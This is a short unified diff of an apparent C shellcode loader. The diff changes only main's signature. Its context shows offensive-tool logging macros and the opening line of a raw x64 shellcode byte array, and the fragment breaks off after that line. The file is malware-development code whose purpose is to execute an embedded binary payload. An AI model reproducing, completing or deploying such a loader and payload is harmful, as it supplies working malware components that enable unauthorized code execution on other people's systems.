@@ -9,7 +9,7 @@
 #define info(msg, ...) printf("[*]" msg "\n", ##__VA_ARGS__)
 #define warn(msg, ...) printf("[-]" msg "\n", ##__VA_ARGS__)
 
-int main(int argc, char *argv[]) {
+int main(void) {
   /*shellcode*/
   unsigned char shellcode[] =
       "\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xcc\x00\x00\x00\x41"
